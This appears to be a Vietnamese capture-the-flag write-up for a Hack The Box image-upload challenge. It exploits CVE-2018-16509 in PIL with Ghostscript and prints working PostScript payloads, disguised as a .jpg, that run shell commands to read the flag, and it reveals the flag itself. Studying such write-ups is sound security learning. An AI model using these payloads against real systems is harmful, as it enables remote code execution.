Nhìn qua thì thấy web chỉ có chức năng là upload file.

Web chỉ cho upload file ảnh (png, jpg, jpeg) nên việc upload file với định dạng khác là không khả thi.
```python
ALLOWED_EXTENSIONS = set(['png', 'jpg', 'jpeg'])

generate = lambda x: os.urandom(x).hex()

def allowed_file(filename):
    return '.' in filename and \
        filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS
```
Ảnh sau khi upload được xử lý bằng hàm `petpet`. Bên trong thực hiện các thao tác như lưu ảnh vào file tạm, generate một ảnh gif dựa trên ảnh này, sau đó đưa nó vào thư mục theo đường dẫn là biến UPLOAD_FOLDER ở trong config. Cuối cùng là xóa ảnh trong tmp.
```python
try:

    tmp_path = save_tmp(file)

    bee = Image.open(tmp_path).convert('RGBA')
    frames = [Image.open(f) for f in sorted(glob.glob('application/static/img/*'))]
    finalpet = petmotion(bee, frames)

    filename = f'{generate(14)}.gif'
    finalpet[0].save(
        f'{main.app.config["UPLOAD_FOLDER"]}/{filename}', 
        save_all=True, 
        duration=30, 
        loop=0, 
        append_images=finalpet[1:], 
    )

    os.unlink(tmp_path)

    return {'status': 'success', 'image': f'static/petpets/{filename}'}, 200
```
Ứng dụng sử dụng thư viện `PIL` để xử lý ảnh, thử research xem `PIL` có CVE nào không. Sau một vòng loanh quanh thì thấy có CVE liên quan đến PIL và Ghostscript để RCE, check lại thì bên trong Dockerfile có tồn tại ghostscript thật.
```sh
# Install Pillow component
RUN curl -L -O https://github.com/ArtifexSoftware/ghostpdl-downloads/releases/download/gs923/ghostscript-9.23-linux-x86_64.tgz \
    && tar -xzf ghostscript-9.23-linux-x86_64.tgz \
    && mv ghostscript-9.23-linux-x86_64/gs-923-linux-x86_64 /usr/local/bin/gs && rm -rf /tmp/ghost*
```

POC ở đây: https://github.com/farisv/PIL-RCE-Ghostscript-CVE-2018-16509

Tạo file `rce.txt` với nội dung sau, đổi tên thành `rce.jpg` và upload:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%echo 'test' > application/static/petpets/a.txt) currentdevice putdeviceprops
```

Upload thành công, truy cập vào đường dẫn `static/petpets/a.txt` ta đọc được nội dung file là test.

Giờ sửa lại payload một chút để đọc flag:
```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%cat flag > application/static/petpets/a.txt) currentdevice putdeviceprops
```

Upload file, truy cập vào đường dẫn `static/petpets/a.txt` và lấy flag:
```
HTB{c0mfy_bzzzzz_rcb33s_v1b3s}
```